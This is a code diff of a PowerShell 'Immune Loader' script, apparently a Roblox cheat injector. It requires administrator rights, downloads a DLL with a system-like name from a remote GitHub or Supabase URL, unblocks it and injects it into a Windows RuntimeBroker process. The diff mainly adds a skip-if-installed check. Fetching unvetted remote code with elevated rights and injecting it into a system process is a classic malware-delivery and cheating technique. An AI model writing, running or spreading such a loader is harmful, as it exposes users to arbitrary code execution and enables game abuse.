@@ -2,7 +2,8 @@
 #Requires -RunAsAdministrator
 
 param(
-    [string]$DllUrl = 'https://eyxbrypeyeqfntyappey.supabase.co/storage/v1/object/public/public-files/sbscmp30_mscorwks.dll'
+    [string]$DllUrl = 'https://raw.githubusercontent.com/JustValkz/DUMPER/refs/heads/main/sbscmp30_mscorwks.dll',
+    [switch]$ForceDownload
 )
 
 $ErrorActionPreference = 'Stop'
@@ -16,21 +17,31 @@ function Write-Step([string]$Message, [string]$Color = 'Cyan') {
     Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
 }
 
+function Test-DllInstalled([string]$DllPath) {
+    return (Test-Path -LiteralPath $DllPath) -and ((Get-Item -LiteralPath $DllPath).Length -gt 0)
+}
+
 try {
     Write-Host ''
     Write-Host '  Immune Loader' -ForegroundColor Cyan
     Write-Host ''
 
-    Write-Step "Downloading DLL..."
-    Invoke-WebRequest -Uri $DllUrl -OutFile $tempDll -UseBasicParsing
-    if (-not (Test-Path -LiteralPath $tempDll) -or (Get-Item $tempDll).Length -le 0) {
-        throw 'Downloaded DLL is missing or empty.'
-    }
+    if ($ForceDownload -or -not (Test-DllInstalled $targetDll)) {
+        Write-Step 'DLL not found. Downloading...'
+        Invoke-WebRequest -Uri $DllUrl -OutFile $tempDll -UseBasicParsing
+        if (-not (Test-Path -LiteralPath $tempDll) -or (Get-Item $tempDll).Length -le 0) {
+            throw 'Downloaded DLL is missing or empty.'
+        }
 
-    Write-Step "Installing to $targetDll"
-    Copy-Item -LiteralPath $tempDll -Destination $targetDll -Force
-    Unblock-File -LiteralPath $targetDll -ErrorAction SilentlyContinue
-    Write-Step "Installed ($((Get-Item $targetDll).Length) bytes)" Green
+        Write-Step "Installing to $targetDll"
+        Copy-Item -LiteralPath $tempDll -Destination $targetDll -Force
+        Unblock-File -LiteralPath $targetDll -ErrorAction SilentlyContinue
+        Write-Step "Installed ($((Get-Item $targetDll).Length) bytes)" Green
+    }
+    else {
+        Write-Step "DLL already installed at $targetDll" Green
+        Write-Step "Size: $((Get-Item $targetDll).Length) bytes"
+    }
 
     Add-Type @'
 using System;
@@ -86,12 +97,12 @@ public class ImmuneInjector {
 
     if (-not $target) { throw 'No RuntimeBroker process available for injection.' }
 
-    Write-Step "Injecting into RuntimeBroker PID $($target.Id)..."
+    Write-Step "Loading $targetDll into RuntimeBroker PID $($target.Id)..."
     if (-not [ImmuneInjector]::X($target.Id, $targetDll)) { throw 'Injection failed.' }
 
     Start-Sleep -Seconds 2
     if (-not (Test-BrokerHasDll $target.Id $targetDll)) {
-        Write-Step 'Injection completed but module visibility could not be verified.' Yellow
+        Write-Step 'Injection completed but sbscmp30_mscorwks.dll could not be verified in RuntimeBroker.' Yellow
     } else {
         Write-Step 'Immune loaded. Open Roblox.' Green
     }
